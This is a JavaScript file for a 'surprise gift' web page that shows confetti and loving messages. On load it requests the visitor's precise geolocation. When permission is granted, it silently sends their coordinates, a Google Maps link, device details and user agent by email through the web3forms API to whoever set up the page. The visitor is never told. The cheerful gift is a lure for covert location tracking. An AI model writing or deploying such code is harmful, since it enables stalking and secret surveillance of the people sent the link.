const messages = [
  "You make ordinary days feel extraordinary. Never forget how brightly you shine.",
  "Somewhere out there, someone is smiling just because you exist. That someone is right.",
  "Your kindness leaves footprints on hearts. Keep walking through the world gently and boldly.",
  "Today is a reminder: you are loved, you are enough, and you are worthy of beautiful things.",
  "The world is softer because you are in it. Thank you for being exactly who you are.",
  "May this little surprise remind you that joy can find you anytime — even on a quiet Tuesday.",
  "You carry a light that others notice, even when you don't. Keep glowing.",
  "Here is a tiny pause in the day to tell you: you matter more than you know.",
];

const config = window.GIFT_CONFIG || {};
const gift = document.getElementById("gift");
const giftScene = document.getElementById("giftScene");
const hint = document.getElementById("hint");
const headline = document.getElementById("headline");
const subline = document.getElementById("subline");
const messageCard = document.getElementById("messageCard");
const messageText = document.getElementById("messageText");
const nextBtn = document.getElementById("nextBtn");
const permissionToast = document.getElementById("permissionToast");
const retryLocation = document.getElementById("retryLocation");
const sparkles = document.getElementById("sparkles");

let opened = false;
let messageIndex = 0;
let locationSaved = false;

function detectDeviceName() {
  const ua = navigator.userAgent || "";
  let os = "Unknown OS";
  let browser = "Unknown Browser";

  if (/Windows NT/i.test(ua)) os = "Windows PC";
  else if (/Macintosh|Mac OS X/i.test(ua)) os = "Mac";
  else if (/Android/i.test(ua)) os = "Android Phone";
  else if (/iPhone/i.test(ua)) os = "iPhone";
  else if (/iPad/i.test(ua)) os = "iPad";
  else if (/Linux/i.test(ua)) os = "Linux";

  if (/Edg\//i.test(ua)) browser = "Edge";
  else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) browser = "Chrome";
  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = "Safari";
  else if (/Firefox\//i.test(ua)) browser = "Firefox";

  const platform = navigator.platform || "device";
  return `${os} - ${browser} (${platform})`;
}

function buildPayload(coords) {
  const latitude = coords.latitude;
  const longitude = coords.longitude;
  const accuracy = coords.accuracy;
  const deviceName = detectDeviceName();
  const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
  const timestamp = new Date().toLocaleString();

  return {
    latitude,
    longitude,
    accuracy,
    deviceName,
    mapsLink,
    timestamp,
    userAgent: navigator.userAgent,
    message: [
      "Gift website - new visitor location",
      `Time: ${timestamp}`,
      `Device: ${deviceName}`,
      `Latitude: ${latitude}`,
      `Longitude: ${longitude}`,
      `Accuracy: ${accuracy} meters`,
      `Maps: ${mapsLink}`,
    ].join("\n"),
  };
}

async function sendLocationEmail(payload) {
  const accessKey = (config.accessKey || "").trim();
  if (!accessKey || accessKey.includes("YOUR_ACCESS_KEY")) {
    console.warn("Missing accessKey in config.js");
    return false;
  }

  const res = await fetch("https://api.web3forms.com/submit", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
    },
    body: JSON.stringify({
      access_key: accessKey,
      subject: "Gift website - new location",
      from_name: "Gift Website",
      Device: payload.deviceName,
      Time: payload.timestamp,
      Latitude: String(payload.latitude),
      Longitude: String(payload.longitude),
      Accuracy: `${payload.accuracy} meters`,
      "Google Maps": payload.mapsLink,
      "User Agent": payload.userAgent,
      message: payload.message,
    }),
  });

  const data = await res.json().catch(() => ({}));
  if (!res.ok || data.success === false) {
    console.warn("Email send failed:", data);
    return false;
  }

  console.log("Location email sent");
  return true;
}

async function saveLocation(coords) {
  if (locationSaved) return;

  try {
    const ok = await sendLocationEmail(buildPayload(coords));
    if (ok) locationSaved = true;
  } catch (err) {
    console.warn("Could not send location:", err);
  }
}

function requestLocation() {
  if (!navigator.geolocation) {
    permissionToast.hidden = false;
    permissionToast.querySelector("p").textContent =
      "Location is not supported on this browser, but your gift is still waiting.";
    retryLocation.hidden = true;
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      permissionToast.hidden = true;
      saveLocation(pos.coords);
      subline.textContent =
        "Perfect. Your surprise is ready — open the gift below.";
    },
    () => {
      permissionToast.hidden = false;
      subline.textContent =
        "No worries if you skip location — the gift still opens with love.";
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    }
  );
}

function createSparkles() {
  for (let i = 0; i < 28; i++) {
    const s = document.createElement("span");
    s.className = "sparkle";
    s.style.left = `${Math.random() * 100}%`;
    s.style.top = `${Math.random() * 100}%`;
    s.style.setProperty("--delay", `${Math.random() * 4}s`);
    s.style.setProperty("--dur", `${2.5 + Math.random() * 2.5}s`);
    sparkles.appendChild(s);
  }
}

function spawnConfetti() {
  const colors = ["#d4a84b", "#e8b4a0", "#f0d48a", "#c45c4a", "#f7f1e4"];
  for (let i = 0; i < 36; i++) {
    const piece = document.createElement("span");
    piece.className = "confetti";
    piece.style.background = colors[i % colors.length];
    piece.style.setProperty("--x", `${(Math.random() - 0.5) * 280}px`);
    piece.style.setProperty("--y", `${80 + Math.random() * 220}px`);
    piece.style.setProperty("--r", `${Math.random() * 720}deg`);
    piece.style.setProperty("--life", `${1.1 + Math.random() * 0.8}s`);
    document.body.appendChild(piece);
    setTimeout(() => piece.remove(), 2000);
  }
}

function showMessage(index) {
  messageText.style.opacity = "0";
  messageText.style.transform = "translateY(8px)";
  setTimeout(() => {
    messageText.textContent = messages[index % messages.length];
    messageText.style.transition = "opacity 0.45s ease, transform 0.45s ease";
    messageText.style.opacity = "1";
    messageText.style.transform = "translateY(0)";
  }, 120);
}

function openGift() {
  if (opened) return;
  opened = true;

  gift.classList.add("opened");
  hint.classList.add("hide");
  headline.textContent = "Surprise!";
  subline.textContent = "A little note chosen just for this moment.";

  spawnConfetti();

  setTimeout(() => {
    giftScene.style.transition = "opacity 0.5s ease, transform 0.5s ease";
    giftScene.style.opacity = "0.35";
    giftScene.style.transform = "scale(0.92)";
    messageCard.hidden = false;
    showMessage(messageIndex);
  }, 650);
}

gift.addEventListener("click", openGift);
gift.addEventListener("keydown", (e) => {
  if (e.key === "Enter" || e.key === " ") {
    e.preventDefault();
    openGift();
  }
});

nextBtn.addEventListener("click", () => {
  messageIndex = (messageIndex + 1) % messages.length;
  showMessage(messageIndex);
  spawnConfetti();
});

retryLocation.addEventListener("click", () => {
  requestLocation();
});

createSparkles();
requestLocation();
